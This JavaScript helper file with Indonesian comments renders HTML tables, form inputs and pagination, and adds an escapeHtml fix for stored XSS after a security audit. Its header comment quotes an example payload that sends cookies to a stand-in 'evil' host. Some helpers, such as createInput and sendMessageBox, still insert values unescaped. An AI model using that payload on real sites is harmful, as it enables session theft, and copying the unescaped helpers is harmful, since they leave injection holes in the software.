/**
 * escapeHtml — pertahanan stored-XSS untuk tableModal()/tableRows() (audit keamanan, 25 Agu 2026).
 * -------------------------------------------------------------------------------------------
 * TEMUAN: kedua fungsi di bawah menyisipkan `row[chunk]` (nama customer, nama kota, nama
 * fasilitas, dst — data yang DITULIS USER lewat form) langsung ke string HTML lalu dirender
 * lewat `v-html` di 7+ ListView.vue DAN di Modal.vue (dipakai semua picker "Pilih Lokasi/
 * Fasilitas/dst"). Tanpa escaping, seorang agent yang mengisi nama "<img src=x
 * onerror=fetch('https://evil/steal?c='+document.cookie)>" akan menjalankan JavaScript itu di
 * SESI SETIAP ORANG yang membuka daftar tersebut — termasuk sesi admin.
 *
 * Dipakai untuk isi SEL TABEL (konteks teks HTML) maupun ATRIBUT (value="...") — kelima
 * karakter di bawah cukup untuk kedua konteks selama atributnya memakai tanda kutip ganda
 * (semua di file ini memang begitu).
 */
function escapeHtml(value) {
    return String(value == null ? '' : value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function formatAngka(angka) {
    return angka.replace(/[^0-9]/g, '');
}

function formatAngkaDesimal(angka) {
    return angka.replace(/[^0-9.]/g, '');
}

// Fungsi untuk memformat angka dengan koma sebagai desimal
function formatNumberWithCommasAndDecimal(number) { // Price, Total
    if (number === '') return '';
    // Menghapus semua karakter selain angka, koma, dan titik
    number = number.toString().replace(/[^0-9.,]/g, '');
    // Memastikan hanya ada satu tanda titik sebagai desimal
    const parts = number.split('.');
    if (parts.length > 2) {
        number = parts[0] + '.' + parts.slice(1).join('');
    }
    // Menghapus koma sebelum memformat ulang angka
    number = number.replace(/,/g, '');
    // Menambahkan pemisah ribuan
    const [integerPart, decimalPart] = number.split('.');
    return decimalPart !== undefined
        ? integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + '.' + decimalPart
        : integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Fungsi untuk memformat angka dengan pemisah ribuan
function formatNumberWithCommas(number) {
    if (number === '') return '';
    number = number.toString().replace(/,/g, '');
    return number.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Format harga dari database: strip trailing decimal zeros (string-based, aman untuk currency),
// lalu tambah pemisah ribuan HANYA pada bagian integer.
// Contoh: 13400000.0000 → "13,400,000" | 170000000.0600 → "170,000,000.06"
function formatPriceDisplay(value) {
    if (value === '' || value === null || value === undefined) return '';
    const str = value.toString().replace(/,/g, '').trim();
    if (!str || !/\d/.test(str)) return '';
    const dotIdx = str.indexOf('.');
    if (dotIdx === -1) {
        return str.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    }
    const intPart = str.slice(0, dotIdx);
    // Strip trailing zeros; if nothing remains, omit decimal point
    const decPart = str.slice(dotIdx + 1).replace(/0+$/, '');
    const formattedInt = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    return decPart ? `${formattedInt}.${decPart}` : formattedInt;
}

// Fungsi untuk menghapus pemisah koma dari angka
function unformatNumber(numberStr) {
    if (numberStr === '') return '';
    return parseFloat(numberStr.replace(/,/g, '').trim());
}

function formatEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function formatPhone(phone) {
    return phone.replace(/[^0-9+-]/g, '').replace(/-/g, '').replace(/(\d{4})(?=\d)/g, '$1-');
}

function sendMessageBox(type, message) {
    var alertTypes = {
        error: "alert-danger",
        success: "alert-success",
        info: "alert-info",
        warning: "alert-warning"
    };
    return `<div class="alert ${alertTypes[type.toLowerCase()] || "alert-warning"} text-center" role="alert">
        ${message}
    </div>`;
}

function tableModal(
    headers = [],
    chunks = [],
    data = [],
    actionUseable = false,
    actionType = [],
    actionParameter = [],
    selectedId = null,
    selectedCodes = []
) {
    // Array untuk menyimpan HTML secara efisien
    let tableParts = [];
    // Jika headers/chunks kosong atau tidak seimbang, gunakan data pertama sebagai referensi
    if (!headers.length || !chunks.length || headers.length !== chunks.length) {
        const chunkKeys = Object.keys(data[0] || {});
        headers = [...chunkKeys];
        chunks = [...chunkKeys];
    }
    // Bagian awal tabel
    tableParts.push(`
        <div class="table-responsive table-main table-striped table-responsive-lg table-responsive-md">
        <table class="table table-hover table-bordered align-middle my-3">
        <thead>
            <tr>
                <th>No.</th>
                ${headers.map(header => `<th>${escapeHtml(header)}</th>`).join('')}
                ${actionUseable && actionType.length && actionParameter.length ? '<th>Action</th>' : ''}
            </tr>
        </thead><tbody>
    `);
    // Iterasi setiap data untuk mengisi baris tabel
    data.forEach((row, index) => {
        tableParts.push(`<tr> <td>${index + 1}</td>`);
        // Isi kolom berdasarkan chunks
        chunks.forEach(chunk => {
            let value = (row[chunk] || '').toString();
            let cellClass = /(?:^|_)(id|code|name|type|date|price|quantity|rate|total)(?:_|$)/.test(chunk) ? '' : 'text-wrap text-break';
            if (chunk === 'status') {
                // Mapping status
                const statusMap = {
                    1: 'Active',
                    2: 'Blocked',
                    3: 'Deleted',
                    O: 'Open',
                    C: 'Canceled',
                    L: 'Closed'
                };
                const badgeClass = {
                    1: 'bg-success',
                    2: 'bg-warning',
                    3: 'bg-danger',
                    O: 'bg-success',
                    C: 'bg-danger',
                    L: 'bg-info'
                };
                tableParts.push(`
                    <td>
                        <span class="badge ${badgeClass[value] || 'bg-secondary text-white'}">
                            ${statusMap[value] || escapeHtml(value)}
                        </span>
                    </td>
                `);
            } else {
                // ★ Titik XSS utama yang diperbaiki (audit keamanan 25 Agu 2026):
                // `value` berasal dari data yang diketik user (nama customer/kota/
                // fasilitas dst) dan sebelumnya masuk mentah ke HTML lewat v-html.
                tableParts.push(`<td class="${cellClass}">${escapeHtml(value)}</td>`);
            }
        });
        // **Kolom Action**
        if (actionUseable && actionType.length && actionParameter.length &&
            (!row.status || row.status < 3 || ['O', 'L', 'C'].includes(row.status))) {
            tableParts.push(`
                <td> <div class="d-flex justify-content-around row" ${actionType.length > 2 ? actionType.length > 3 ? 'style="width: 18rem;"' : 'style="width: 17rem;"' : ''}>
                <div class="col-12">
            `);
            // actionParameter biasanya ID yang dibuat server (aman), tapi di beberapa
            // picker (mis. Modal.vue) juga membawa `name` yang diketik user — di-escape
            // supaya tidak bisa keluar dari atribut value="..." (audit keamanan 25 Agu 2026).
            let actionValue = actionParameter.map(id => escapeHtml((row[id] || '').toString().trim())).join('|');
            let isStatusOpen = row.status === 'O';  // **Hanya untuk closed & cancel**
            // **Objek konfigurasi tombol**
            const buttonConfig = {
                check: {
                    class: 'form-control-sm form-check-input',
                    tag: 'input',
                    extraAttr: selectedId && selectedCodes.includes(row[selectedId]) ? 'checked disabled' : '',
                },
                update: { class: 'btn btn-info text-white fas fa-edit w-25', tag: 'button' },
                block: {
                    class: row.status == 1 ? 'btn btn-warning text-white fas fa-lock w-25' : 'btn btn-warning text-white fas fa-unlock w-25',
                    tag: 'button',
                    extraValue: row.status
                },
                delete: { class: 'btn btn-danger text-white fas fa-trash w-25', tag: 'button' },
                choose: { class: 'btn btn-success text-white fas fa-download  w-25', tag: 'button' },
                closed: isStatusOpen ? { class: 'btn btn-success text-white fas fa-check w-25', tag: 'button' } : null,
                cancel: isStatusOpen ? { class: 'btn btn-danger text-white fas fa-times w-25', tag: 'button' } : null
            };
            // **Iterasi dan buat tombol hanya jika config tersedia**
            actionType.forEach(action => {
                let config = buttonConfig[action];
                if (config) {
                    if (config.tag === 'input') {
                        tableParts.push(`
                            <input class="${config.class}" type="checkbox" name="checkChoose[]" value="${actionValue}" ${config.extraAttr || ''}>
                        `);
                    } else {
                        tableParts.push(`
                            <button class="${config.class}"
                                name="btn${action.charAt(0).toUpperCase() + action.slice(1)}"
                                value="${actionValue + (config.extraValue || '')}">
                            </button>
                        `);
                    }
                }
            });
            tableParts.push(`</div></div></td>
            `);
        }
        // Akhir baris
        tableParts.push(`</tr>`);
    });
    // Akhiran tabel
    tableParts.push(`</tbody></table></div>`);
    // Gabungkan array menjadi satu string HTML
    return tableParts.join('');
}

function selectedButtonAdd(chunks, data, dataId, dataName, printId) {
    // row[dataName]/row[chunk] adalah nama yang diketik user (audit keamanan
    // 25 Agu 2026) — sama seperti tableModal(), di-escape sebelum masuk HTML.
    var tableHTML = `<div class="row">`;
    data.forEach((row, index) => {
        chunks.forEach(chunk => {
            tableHTML += `<button value="` + escapeHtml(row[dataId]) + "|" + escapeHtml(row[dataName]) + `" name=` + printId + ` class="btn btn-secondary col-lg-12 text-white mb-2">` + escapeHtml(row[chunk]) + `</button>`;
        });
    });
    tableHTML += `</div>`;
    return tableHTML;
}

function inputReadOnly(propertyId, value) {
    return createInput(propertyId, value, 'readonly');
}

function inputHidden(propertyId, value) {
    return createInput(propertyId, value, 'hidden');
}

function createInput(propertyId, value, mode = 'readonly') {
    // Pastikan mode hanya 'readonly' atau 'hidden'
    if (mode !== 'hidden' && mode !== 'readonly') {
        throw new Error('Tipe mode tidak dikenal. Gunakan "readonly" atau "hidden".');
    }
    // Tentukan tipe input: "text" atau "hidden"
    var inputType = (mode === 'hidden') ? 'hidden' : 'text';
    // Untuk input readonly, tambahkan atribut "readonly"
    var readOnlyAttr = (mode === 'readonly') ? ' readonly' : '';
    // Return string HTML
    return `<input type="${inputType}" class="form-control form-control-lg mb-2" id="${propertyId}" name="${propertyId}" value="${value}"${readOnlyAttr}>`;
}

function checkedInput(property, value, data) {
    if (data.includes(value)) {
        property.prop('checked', true);
    }
}

function loadAffordance(data, properties) {
    properties
    .filter(function() {
        return data.includes($(this).val());
    })
    .prop('checked', true);
}

function loadPagination(data) {
    var { current_page, last_page } = data;
    // Bangun string untuk setiap nomor halaman
    let pages = '';
    for (let i = 1; i <= last_page; i++) {
        pages += `
        <li class="page-item${current_page === i ? ' active' : ''}">
            <a class="page-link" href="#" onclick="changePage(${i})">${i}</a>
        </li>
        `;
    }
    // Gabungkan semua dalam satu template literal
    return `
    <ul class="pagination justify-content-center">
        <li class="page-item${current_page === 1 ? ' disabled' : ''}">
            <a class="page-link" href="#" aria-label="Previous" onclick="changePage(${current_page - 1})">
            <span aria-hidden="true">&laquo;</span>
            </a>
        </li>
        ${pages}
        <li class="page-item${current_page === last_page ? ' disabled' : ''}">
            <a class="page-link" href="#" aria-label="Next" onclick="changePage(${current_page + 1})">
            <span aria-hidden="true">&raquo;</span>
            </a>
        </li>
    </ul>
    `;
}

function loadModalPagination(pagination) {
    var currentPage = parseInt(pagination.current_page, 10);
    var lastPage    = parseInt(pagination.last_page, 10);
    const pages       = [];
    // Jika lastPage > 7, tampilkan hanya halaman-halaman relevan
    if (lastPage > 7) {
        // 1) Halaman pertama & ellipsis
        if (currentPage > 3) {
            pages.push(`
                <li class="page-item">
                    <a class="page-link" href="#" data-page="1">1</a>
                </li>
            `);
            if (currentPage > 4) {
                pages.push(`
                    <li class="page-item disabled">
                        <span class="page-link">...</span>
                    </li>
                `);
            }
        }
        // 2) Tampilkan 2 halaman sebelum & sesudah currentPage
        for (let i = currentPage - 2; i <= currentPage + 2; i++) {
            if (i > 0 && i <= lastPage) {
                pages.push(`
                    <li class="page-item${currentPage === i ? ' active' : ''}">
                        <a class="page-link" href="#" data-page="${i}">${i}</a>
                    </li>
                `);
            }
        }
        // 3) Halaman terakhir & ellipsis jika currentPage < lastPage - 2
        if (currentPage < lastPage - 2) {
            if (currentPage < lastPage - 3) {
                pages.push(`
                    <li class="page-item disabled">
                        <span class="page-link">...</span>
                    </li>
                `);
            }
            pages.push(`
                <li class="page-item">
                    <a class="page-link" href="#" data-page="${lastPage}">${lastPage}</a>
                </li>
            `);
        }
    } else {
        // Jika lastPage <= 7, tampilkan semua halaman
        for (let i = 1; i <= lastPage; i++) {
            pages.push(`
                <li class="page-item${currentPage === i ? ' active' : ''}">
                    <a class="page-link" href="#" data-page="${i}">${i}</a>
                </li>
            `);
        }
    }
    // Tombol Previous & Next
    return `
        <ul class="pagination justify-content-center">
            <li class="page-item${currentPage === 1 ? ' disabled' : ''}">
                <a class="page-link" href="#" data-page="${currentPage - 1}">&laquo;</a>
            </li>
            ${pages.join('')}
            <li class="page-item${currentPage === lastPage ? ' disabled' : ''}">
                <a class="page-link" href="#" data-page="${currentPage + 1}">&raquo;</a>
            </li>
        </ul>
    `;
}

function tableRows(
    chunks = [],
    input = [],
    elementName = [],
    attribute = [],
    width = [],
    data = [],
    actionUseable = false,
    actionType = [],
    actionParameter = [],
    selectedId = null,
    selectedCodes = []
) {
    var parts = []; // Array penampung potongan HTML
    // Jika panjang chunks/input tidak sesuai, ambil kunci dari data[0]
    if (chunks.length < 2 ||
        input.length !== chunks.length ||
        width.length !== chunks.length ||
        elementName.length !== chunks.length
    ) {
        const chunkKeys = Object.keys(data[0]);
        chunkKeys.forEach((rowKey, i) => {
        chunks[i] = rowKey;
        input[i] = 'text';
        elementName[i] = rowKey;
        attribute[i] = '';
        width[i] = '15';
        });
    }
    // === Jika data terdefinisi (bukan null) ===
    if (data !== null) {
        data.forEach(rowObj => {
        // Mulai baris baru dengan kolom nomor
        parts.push('<tr><td></td>');

        chunks.forEach((chunk, i) => {
            var useTextarea = (input[i] === 'textarea');
            var styleWidth = width[i] > 0 ? `style="width: ${width[i]}rem;"` : '';
            // ★ Sama seperti tableModal() (audit keamanan 25 Agu 2026): chunkValue
            // adalah data yang sebelumnya diketik user, dirender lagi di form edit
            // lewat v-html. Di-escape supaya tidak bisa keluar dari isi <textarea>
            // atau dari atribut value="..." (contoh nyata: nama berisi `"><script>`).
            var chunkValueRaw = (!chunk.includes('**') && rowObj[chunk]) ? rowObj[chunk] : '';
            var chunkValue = escapeHtml(chunkValueRaw);
            if (useTextarea) {
            parts.push(`
                <td>
                <textarea
                    ${styleWidth}
                    class="form-control form-control-lg ${elementName[i]}"
                    name="${elementName[i]}[]"
                    rows="1"
                    ${attribute[i] === 'readonly' ? 'readonly' : ''}
                    ${attribute[i] === 'required' ? 'required' : ''}
                    ${attribute[i] === 'autofocus' ? 'autofocus' : ''}
                    ${attribute[i] === 'autocomplete' ? 'autocomplete="off"' : ''}
                    ${attribute[i] === 'autocomplete required' ? 'autocomplete="off" required' : ''}
                >${chunkValue}</textarea>
                </td>
            `);
            } else {
            parts.push(`
                <td>
                <input
                    type="${input[i]}"
                    ${styleWidth}
                    class="form-control form-control-lg ${elementName[i]}"
                    name="${elementName[i]}[]"
                    value="${chunkValue}"
                    ${attribute[i] === 'readonly' ? 'readonly' : ''}
                    ${attribute[i] === 'required' ? 'required' : ''}
                    ${attribute[i] === 'autofocus' ? 'autofocus' : ''}
                    ${attribute[i] === 'autocomplete' ? 'autocomplete="off"' : ''}
                    ${attribute[i] === 'autocomplete required' ? 'autocomplete="off" required' : ''}
                />
                </td>
            `);
            }
        });
        // Bagian aksi (check, update, block, delete, choose) jika diperlukan
        if (actionUseable && actionType.length && actionParameter !== '') {
            parts.push('<td>');
            actionType.forEach(action => {
            if (action === 'check') {
                let isChecked = '', isDisabled = '';
                if (selectedId) {
                isChecked = selectedCodes.includes(rowObj[selectedId]) ? 'checked' : '';
                isDisabled = selectedCodes.includes(rowObj[selectedId]) ? 'disabled' : '';
                }
                parts.push(`
                <input
                    class="form-control-sm form-check-input checkChoose"
                    type="checkbox"
                    name="checkChoose[]"
                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}"
                    ${isChecked} ${isDisabled}
                >
                `);
            } else if (action === 'update') {
                parts.push(`
                <button
                    class="btn btn-info text-white fas fa-edit btnUpdate"
                    name="btnUpdate"
                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}">
                </button>
                `);
            } else if (action === 'block') {
                if (rowObj.status == 1) {
                    parts.push(`
                        <button
                        class="btn btn-warning text-white fas fa-lock btnBlock"
                        name="btnBlock"
                        value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|') + rowObj.status}">
                        </button>
                    `);
                } else {
                    parts.push(`
                        <button
                        class="btn btn-warning text-white fas fa-unlock btnBlock"
                        name="btnBlock"
                        value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|') + rowObj.status}">
                        </button>
                    `);
                }
            } else if (action === 'delete') {
                parts.push(`
                <button
                    class="btn btn-danger text-white fas fa-trash btnDelete"
                    name="btnDelete"
                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}">
                </button>
                `);
            } else if (action === 'choose') {
                parts.push(`
                <button
                    class="btn btn-success text-white fas fa-download btnChoose"
                    name="btnChoose"
                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}">
                </button>
                `);
            }
            });
            parts.push('</td>');
        }
        parts.push('</tr>');
        });
    }
    // === Jika data null, buat satu baris kosong ===
    else {
        parts.push('<tr><td></td>');
        chunks.forEach((chunk, i) => {
        var useTextarea = (input[i] === 'textarea');
        var styleWidth = width[i] > 0 ? `style="width: ${width[i]}rem;"` : '';
        if (useTextarea) {
            parts.push(`
            <td>
                <textarea
                ${styleWidth}
                class="form-control form-control-lg ${elementName[i]}"
                name="${elementName[i]}[]"
                rows="1"
                ${attribute[i] === 'readonly' ? 'readonly' : ''}
                ${attribute[i] === 'required' ? 'required' : ''}
                ${attribute[i] === 'autofocus' ? 'autofocus' : ''}
                ${attribute[i] === 'autocomplete' ? 'autocomplete="off"' : ''}
                ${attribute[i] === 'autocomplete required' ? 'autocomplete="off" required' : ''}
                ></textarea>
            </td>
            `);
        } else {
            parts.push(`
            <td>
                <input
                type="${input[i]}"
                ${styleWidth}
                class="form-control form-control-lg ${elementName[i]}"
                name="${elementName[i]}[]"
                value=""
                ${attribute[i] === 'readonly' ? 'readonly' : ''}
                ${attribute[i] === 'required' ? 'required' : ''}
                ${attribute[i] === 'autofocus' ? 'autofocus' : ''}
                ${attribute[i] === 'autocomplete' ? 'autocomplete="off"' : ''}
                ${attribute[i] === 'autocomplete required' ? 'autocomplete="off" required' : ''}
                />
            </td>
            `);
        }
        });
        if (actionUseable && actionType.length && actionParameter !== '') {
            parts.push('<td>');
            actionType.forEach(action => {
                if (action === 'check') {
                    parts.push(`
                        <input class="form-control-sm form-check-input checkChoose"
                                type="checkbox" name="checkChoose[]" value="">
                    `);
                } else if (action === 'update') {
                    parts.push(`
                        <button
                        class="btn btn-info text-white fas fa-edit btnUpdate"
                        name="btnUpdate"
                        value="">
                        </button>
                    `);
                } else if (action === 'block') {
                    parts.push(`
                        <button
                        class="btn btn-warning text-white fas fa-lock btnBlock"
                        name="btnBlock"
                        value="">
                        </button>
                    `);
                } else if (action === 'delete') {
                    parts.push(`
                        <button
                        class="btn btn-danger text-white fas fa-trash btnDelete"
                        name="btnDelete"
                        value="">
                        </button>
                    `);
                } else if (action === 'choose') {
                    parts.push(`
                        <button
                        class="btn btn-success text-white fas fa-download btnChoose"
                        name="btnChoose"
                        value="">
                        </button>
                    `);
                }
            });
            parts.push('</td>');
        }
        parts.push('</tr>');
    }
    // Gabungkan semua potongan HTML
    return parts.join('');
}

function newItemForLastDelete(headers, names, chunks, data, columns, button) {
    // Pengecekan headers atau chunks yang null
    if (headers.length < 2 || chunks.length < 2 || headers.length !== chunks.length || names.length !== chunks.length) {
        const chunkKeys = Object.keys(data[0]);
        headers = [...chunkKeys];
        chunks = [...chunkKeys];
        names = [...chunkKeys];
        columns = Array(chunkKeys.length).fill("col-sm-12");
    }
    return `
    <div class="form-group mb-1">
        <div class="row">
            ${chunks.map((chunk, index) => `
                <div class="${columns[index] || 'col-sm-12'}">
                    <label class="col-form-label">${escapeHtml(headers[index])}</label>
                    <input type="text" class="form-control form-control-lg"
                        name="${names[index]}[]"
                        id="${names[index]};${index + 1}"
                        value="${escapeHtml(data[chunk] || '')}" readonly />
                </div>
            `).join('')}
            <div class="col-sm-12 mt-2 text-right">
                <button class="btn btn-danger form-control form-control-lg ${button}">Delete</button>
            </div>
        </div>
    </div>`;
}
